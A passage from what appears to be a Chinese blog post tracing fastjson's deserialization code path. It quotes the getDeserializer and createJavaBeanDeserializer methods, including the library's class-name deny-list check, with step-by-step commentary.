&#125;</span><br><span class="line"></span><br><span class="line">        obj = instance;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;create instance error&quot;</span>, var23);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson序列化和反序列化/14.png" alt="14" style="zoom:50%;" /></div></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br></pre></td></tr></table></figure><p>查看这个方法，判断<code>type</code>是否是<code>Class</code>类型、<code>ParameterizedType</code>类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">getDeserializer</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">    ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> derializer;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getDeserializer((Class)type, type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">        Type rawType = ((ParameterizedType)type).getRawType();</span><br><span class="line">        <span class="keyword">return</span> rawType <span class="keyword">instanceof</span> Class ? <span class="keyword">this</span>.getDeserializer((Class)rawType, type) : <span class="keyword">this</span>.getDeserializer(rawType);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaObjectDeserializer.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-3-获取反序列化工具类"><a href="#2-2-3-获取反序列化工具类" class="headerlink" title="2.2.3 获取反序列化工具类"></a>2.2.3 获取反序列化工具类</h4><p>getDeserializer方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> </span>&#123;</span><br><span class="line">    ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> derializer;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="keyword">null</span>) &#123;</span><br><span class="line">            type = clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">        <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            JSONType annotation = (JSONType)clazz.getAnnotation(JSONType.class);</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; mappingTo = annotation.mappingTo();</span><br><span class="line">                <span class="keyword">if</span> (mappingTo != Void.class) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">this</span>.getDeserializer(mappingTo, mappingTo);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (type <span class="keyword">instanceof</span> WildcardType || type <span class="keyword">instanceof</span> TypeVariable || type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">                derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(clazz);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String className = clazz.getName();</span><br><span class="line">                className = className.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                    String deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;parser deny : &quot;</span> + className);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.awt.&quot;</span>) &amp;&amp; AwtCodec.support(clazz) &amp;&amp; !awtError) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.awt.Point&quot;</span>), AwtCodec.instance);</span><br><span class="line">                        <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.awt.Font&quot;</span>), AwtCodec.instance);</span><br><span class="line">                        <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.awt.Rectangle&quot;</span>), AwtCodec.instance);</span><br><span class="line">                        <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.awt.Color&quot;</span>), AwtCodec.instance);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var11) &#123;</span><br><span class="line">                        awtError = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    derializer = AwtCodec.instance;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!jdk8Error) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.time.&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.LocalDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.LocalDate&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.LocalTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.ZonedDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.OffsetDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.OffsetTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.ZoneOffset&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.ZoneRegion&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.ZoneId&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.Period&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.Duration&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.Instant&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(clazz);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.util.Optional&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.util.Optional&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.util.OptionalDouble&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.util.OptionalInt&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.util.OptionalLong&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                            derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(clazz);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var10) &#123;</span><br><span class="line">                        jdk8Error = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (className.equals(<span class="string">&quot;java.nio.file.Path&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.derializers.put(clazz, MiscCodec.instance);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz == Entry.class) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.derializers.put(clazz, MiscCodec.instance);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Iterator var17 = ServiceLoader.load(AutowiredObjectDeserializer.class, classLoader).iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var17.hasNext()) &#123;</span><br><span class="line">                        AutowiredObjectDeserializer autowired = (AutowiredObjectDeserializer)var17.next();</span><br><span class="line">                        Iterator var8 = autowired.getAutowiredFor().iterator();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span>(var8.hasNext()) &#123;</span><br><span class="line">                            Type forType = (Type)var8.next();</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(forType, autowired);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (derializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz.isEnum()) &#123;</span><br><span class="line">                        derializer = <span class="keyword">new</span> EnumDeserializer(clazz);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">                        derializer = ObjectArrayCodec.instance;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != Set.class &amp;&amp; clazz != HashSet.class &amp;&amp; clazz != Collection.class &amp;&amp; clazz != List.class &amp;&amp; clazz != ArrayList.class) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (Collection.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            derializer = CollectionCodec.instance;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            derializer = MapDeserializer.instance;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            derializer = <span class="keyword">new</span> ThrowableDeserializer(<span class="keyword">this</span>, clazz);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            derializer = <span class="keyword">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        derializer = CollectionCodec.instance;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.putDeserializer((Type)type, (ObjectDeserializer)derializer);</span><br><span class="line">                    <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>首先通过<code>JSONType annotation = (JSONType)clazz.getAnnotation(JSONType.class);</code>判断并获取类中注解</p></li><li><p>替换<code>className</code>中的<code>$</code>为<code>.</code></p><h5 id="2-2-3-1-类加载黑名单"><a href="#2-2-3-1-类加载黑名单" class="headerlink" title="2.2.3.1 类加载黑名单"></a>2.2.3.1 类加载黑名单</h5></li><li><p>判断是否为denyList，此时列表中只有两个线程类名</p></li><li><p>判断是否以java.awt.开头，<code>java.awt.Point、java.awt.Font、java.awt.Rectangle、java.awt.Color</code></p></li></ul><div align=center><img src="/img/fastjson序列化和反序列化/15.png" alt="15" style="zoom:50%;" /></div><ul><li>放入指定的java.time.* 和java.util.Optional*</li></ul><div align=center><img src="/img/fastjson序列化和反序列化/16.png" alt="16" style="zoom:50%;" /></div><ul><li>判断是否为<code>java.nio.file.Path</code></li><li>判断是否为<code>java.util.Entry</code></li><li>针对clazz做了一些类型的判断后，<code>derializer = this.createJavaBeanDeserializer(clazz, (Type)type);</code></li></ul><div align=center><img src="/img/fastjson序列化和反序列化/17.png" alt="17" style="zoom:50%;" /></div><ul><li><code>createJavaBeanDeserializer</code><ul><li>获取superClass，如果没有<code>superClass=clazz</code>，判断类的方法修饰符是否为<code>Public</code></li><li>判断clazz.getTypeParameters().length是否为0，如果底层泛型声明没有声明类型变量，则为0</li><li><code>ASMUtils.checkName(clazz.getSimpleName())</code>检查类名</li><li>判断<code>clazz</code>是否是接口</li><li><code>com.alibaba.fastjson.util.JavaBeanInfo.build</code>创建<code>beanInfo</code>，其中初始化创建对象时，获取了<code>clazz</code>的<code>Fields</code>、<code>Methods</code>、<code>Constructor</code><ul><li>判断默认的构造方法是否为空，类不是接口，修饰符不是抽象的</li><li>判断<code>builderClass</code>是否为空</li><li>遍历所有的<code>Method</code></li></ul></li></ul></li></ul><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TypeVariable[] tValue = List.class.getTypeParameters();</span><br><span class="line">System.out.println(tValue[<span class="number">0</span>].getName());</span><br><span class="line"><span class="comment">//输出为E</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">createJavaBeanDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> asmEnable = <span class="keyword">this</span>.asmEnable;</span><br><span class="line">    <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">        JSONType jsonType = (JSONType)clazz.getAnnotation(JSONType.class);</span><br><span class="line">        Class superClass;</span><br><span class="line">        <span class="keyword">if</span> (jsonType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            superClass = jsonType.deserializer();</span><br><span class="line">            <span class="keyword">if</span> (superClass != Void.class) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Object deseralizer = superClass.newInstance();</span><br><span class="line">                    <span class="keyword">if</span> (deseralizer <span class="keyword">instanceof</span> ObjectDeserializer) &#123;</span><br><span class="line">                        <span class="keyword">return</span> (ObjectDeserializer)deseralizer;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var16) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            asmEnable = jsonType.asm();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">            superClass = JavaBeanInfo.getBuilderClass(jsonType);</span><br><span class="line">            <span class="keyword">if</span> (superClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">                superClass = clazz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!Modifier.isPublic(superClass.getModifiers())) &#123;</span><br><span class="line">                    asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                superClass = superClass.getSuperclass();</span><br><span class="line">            &#125; <span class="keyword">while</span>(superClass != Object.class &amp;&amp; superClass != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz.getTypeParameters().length != <span class="number">0</span>) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asmEnable &amp;&amp; <span class="keyword">this</span>.asmFactory != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.asmFactory.classLoader.isExternalClass(clazz)) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">        asmEnable = ASMUtils.checkName(clazz.getSimpleName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JavaBeanInfo beanInfo;</span><br><span class="line">    <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.isInterface()) &#123;</span><br><span class="line">            asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        beanInfo = JavaBeanInfo.build(clazz, type, <span class="keyword">this</span>.propertyNamingStrategy);</span><br><span class="line">        <span class="keyword">if</span> (asmEnable &amp;&amp; beanInfo.fields.length &gt; <span class="number">200</span>) &#123;</span><br><span class="line">            asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; defaultConstructor = beanInfo.defaultConstructor;</span><br><span class="line">        <span class="keyword">if</span> (asmEnable &amp;&amp; defaultConstructor == <span class="keyword">null</span> &amp;&amp; !clazz.isInterface()) &#123;</span><br><span class="line">            asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        FieldInfo[] var18 = beanInfo.fields;</span><br><span class="line">        <span class="keyword">int</span> var7 = var18.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var8 = <span class="number">0</span>; var8 &lt; var7; ++var8) &#123;</span><br><span class="line">            FieldInfo fieldInfo = var18[var8];</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; fieldClass = fieldInfo.fieldClass;</span><br><span class="line">            <span class="keyword">if</span> (!Modifier.isPublic(fieldClass.getModifiers())) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fieldClass.isMemberClass() &amp;&amp; !Modifier.isStatic(fieldClass.getModifiers())) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getMember() != <span class="keyword">null</span> &amp;&amp; !ASMUtils.checkName(fieldInfo.getMember().getName())) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            JSONField annotation = fieldInfo.getAnnotation();</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="keyword">null</span> &amp;&amp; (!ASMUtils.checkName(annotation.name()) || annotation.format().length() != <span class="number">0</span> || annotation.deserializeUsing() != Void.class)) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fieldClass.isEnum()) &#123;</span><br><span class="line">                ObjectDeserializer fieldDeser = <span class="keyword">this</span>.getDeserializer((Type)fieldClass);</span><br><span class="line">                <span class="keyword">if</span> (!(fieldDeser <span class="keyword">instanceof</span> EnumDeserializer)) &#123;</span><br><span class="line">                    asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asmEnable &amp;&amp; clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!asmEnable) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, clazz, type);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanInfo = JavaBeanInfo.build(clazz, type, <span class="keyword">this</span>.propertyNamingStrategy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.asmFactory.createJavaBeanDeserializer(<span class="keyword">this</span>, beanInfo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var13) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, clazz, type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException var14) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, beanInfo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;create asm deserializer error, &quot;</span> + clazz.getName(), var15);</span><br><span class="line">        